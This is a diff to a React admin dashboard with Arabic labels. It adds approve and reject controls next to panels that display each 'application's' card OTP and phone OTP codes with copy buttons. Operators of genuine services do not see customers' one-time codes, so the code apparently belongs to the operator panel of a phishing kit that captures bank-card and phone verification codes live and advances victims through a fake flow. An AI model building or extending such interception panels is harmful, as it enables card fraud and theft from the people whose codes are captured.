@@ -1336,65 +1336,149 @@ export default function Dashboard() {
                     <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                       <Key size={16} className="text-blue-500" />
                       رموز التحقق
+                      {!selectedApplication.cardOtpApproved && selectedApplication.otpCode && (
+                        <Badge className="bg-amber-100 text-amber-700 text-[9px] animate-pulse mr-2">
+                          بانتظار الموافقة
+                        </Badge>
+                      )}
+                      {selectedApplication.cardOtpApproved && (
+                        <Badge className="bg-green-100 text-green-700 text-[9px] mr-2">
+                          تمت الموافقة
+                        </Badge>
+                      )}
                     </h3>
                   </div>
-                  <div className="p-6 grid grid-cols-2 gap-4">
-                    {selectedApplication.otpCode && (
-                      <div className="bg-blue-50 dark:bg-blue-900/30 rounded-lg p-4 text-center">
-                        <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">
-                          OTP البطاقة
-                        </p>
-                        <p
-                          className="font-mono text-2xl font-bold text-blue-600 dark:text-blue-400"
-                          data-testid="text-card-otp"
-                        >
-                          {selectedApplication.otpCode}
-                        </p>
+                  <div className="p-6 space-y-4">
+                    <div className="grid grid-cols-2 gap-4">
+                      {selectedApplication.otpCode && (
+                        <div className={cn(
+                          "rounded-lg p-4 text-center",
+                          selectedApplication.cardOtpApproved 
+                            ? "bg-green-50 dark:bg-green-900/30 border-2 border-green-500" 
+                            : "bg-blue-50 dark:bg-blue-900/30"
+                        )}>
+                          <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">
+                            OTP البطاقة
+                          </p>
+                          <p
+                            className={cn(
+                              "font-mono text-2xl font-bold",
+                              selectedApplication.cardOtpApproved 
+                                ? "text-green-600 dark:text-green-400" 
+                                : "text-blue-600 dark:text-blue-400"
+                            )}
+                            data-testid="text-card-otp"
+                          >
+                            {selectedApplication.otpCode}
+                          </p>
+                          {selectedApplication.cardOtpApproved && (
+                            <Badge className="bg-green-500 text-white mt-2">
+                              <CheckCircle size={12} className="ml-1" />
+                              تمت الموافقة
+                            </Badge>
+                          )}
+                          <Button
+                            size="sm"
+                            variant="outline"
+                            className="mt-2"
+                            onClick={() =>
+                              copyToClipboard(
+                                selectedApplication.otpCode!,
+                                "OTP البطاقة",
+                              )
+                            }
+                            data-testid="button-copy-card-otp"
+                          >
+                            <Copy size={12} className="ml-1" />
+                            نسخ
+                          </Button>
+                        </div>
+                      )}
+                      {selectedApplication.phoneOtpCode && (
+                        <div className={cn(
+                          "rounded-lg p-4 text-center",
+                          selectedApplication.phoneOtpApproved 
+                            ? "bg-green-50 dark:bg-green-900/30 border-2 border-green-500" 
+                            : "bg-pink-50 dark:bg-pink-900/30"
+                        )}>
+                          <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">
+                            OTP الهاتف
+                          </p>
+                          <p
+                            className={cn(
+                              "font-mono text-2xl font-bold",
+                              selectedApplication.phoneOtpApproved 
+                                ? "text-green-600 dark:text-green-400" 
+                                : "text-pink-600 dark:text-pink-400"
+                            )}
+                            data-testid="text-phone-otp"
+                          >
+                            {selectedApplication.phoneOtpCode}
+                          </p>
+                          {selectedApplication.phoneOtpApproved && (
+                            <Badge className="bg-green-500 text-white mt-2">
+                              <CheckCircle size={12} className="ml-1" />
+                              تمت الموافقة
+                            </Badge>
+                          )}
+                          <Button
+                            size="sm"
+                            variant="outline"
+                            className="mt-2"
+                            onClick={() =>
+                              copyToClipboard(
+                                selectedApplication.phoneOtpCode!,
+                                "OTP الهاتف",
+                              )
+                            }
+                            data-testid="button-copy-phone-otp"
+                          >
+                            <Copy size={12} className="ml-1" />
+                            نسخ
+                          </Button>
+                        </div>
+                      )}
+                    </div>
+                    {/* OTP Approval Buttons */}
+                    <div className="flex flex-wrap gap-2 pt-2 border-t border-border">
+                      {selectedApplication.otpCode && !selectedApplication.cardOtpApproved && (
                         <Button
                           size="sm"
-                          variant="outline"
-                          className="mt-2"
-                          onClick={() =>
-                            copyToClipboard(
-                              selectedApplication.otpCode!,
-                              "OTP البطاقة",
-                            )
-                          }
-                          data-testid="button-copy-card-otp"
+                          onClick={() => {
+                            handleFieldApproval(selectedApplication.id, "cardOtpApproved", true);
+                            handleApprovalStatus(selectedApplication.id, "approved_otp");
+                          }}
+                          className="bg-emerald-600 hover:bg-emerald-700"
+                          data-testid="button-approve-card-otp"
                         >
-                          <Copy size={12} className="ml-1" />
-                          نسخ
+                          <CheckCircle className="h-4 w-4 ml-2" />
+                          موافقة OTP البطاقة
                         </Button>
-                      </div>
-                    )}
-                    {selectedApplication.phoneOtpCode && (
-                      <div className="bg-pink-50 dark:bg-pink-900/30 rounded-lg p-4 text-center">
-                        <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">
-                          OTP الهاتف
-                        </p>
-                        <p
-                          className="font-mono text-2xl font-bold text-pink-600 dark:text-pink-400"
-                          data-testid="text-phone-otp"
-                        >
-                          {selectedApplication.phoneOtpCode}
-                        </p>
+                      )}
+                      {selectedApplication.phoneOtpCode && !selectedApplication.phoneOtpApproved && (
                         <Button
                           size="sm"
-                          variant="outline"
-                          className="mt-2"
-                          onClick={() =>
-                            copyToClipboard(
-                              selectedApplication.phoneOtpCode!,
-                              "OTP الهاتف",
-                            )
-                          }
-                          data-testid="button-copy-phone-otp"
+                          onClick={() => handleFieldApproval(selectedApplication.id, "phoneOtpApproved", true)}
+                          className="bg-pink-600 hover:bg-pink-700"
+                          data-testid="button-approve-phone-otp"
                         >
-                          <Copy size={12} className="ml-1" />
-                          نسخ
+                          <CheckCircle className="h-4 w-4 ml-2" />
+                          موافقة OTP الهاتف
                         </Button>
-                      </div>
-                    )}
+                      )}
+                      {(selectedApplication.otpCode || selectedApplication.phoneOtpCode) && 
+                       !selectedApplication.cardOtpApproved && !selectedApplication.phoneOtpApproved && (
+                        <Button
+                          size="sm"
+                          variant="destructive"
+                          onClick={() => handleApprovalStatus(selectedApplication.id, "rejected")}
+                          data-testid="button-reject-otp"
+                        >
+                          <Ban className="h-4 w-4 ml-2" />
+                          رفض
+                        </Button>
+                      )}
+                    </div>
                   </div>
                 </div>
               )}
